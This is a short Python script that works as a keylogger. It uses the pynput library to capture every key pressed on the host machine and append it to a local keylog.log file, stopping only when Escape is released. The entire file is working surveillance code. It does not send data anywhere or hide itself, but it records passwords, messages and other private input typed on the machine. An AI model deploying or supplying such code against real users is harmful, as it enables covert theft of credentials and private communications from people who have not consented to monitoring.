from pynput.keyboard import Key, Listener
import os

pressed_keys = {}

# Get the current directory where the script is located
current_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(current_directory, 'keylog.log')

def storeKeysToFile():  
    with open(log_file_path, 'a') as log:  
        for key, char in pressed_keys.items():
            if char is not None:
                log.write(char + ' ')
            else:
                log.write('Unknown key ')
        log.write('\n')

def onKeyPress(key):  
    if hasattr(key, 'char'):
        pressed_keys[key] = key.char
    else:
        pressed_keys[key] = str(key)
    storeKeysToFile()

def onKeyRelease(key):
    if key in pressed_keys:
        del pressed_keys[key]
    if key == Key.esc:  
        return False

with Listener(  
    on_press = onKeyPress,  
    on_release = onKeyRelease  
) as listener:  
    listener.join()  
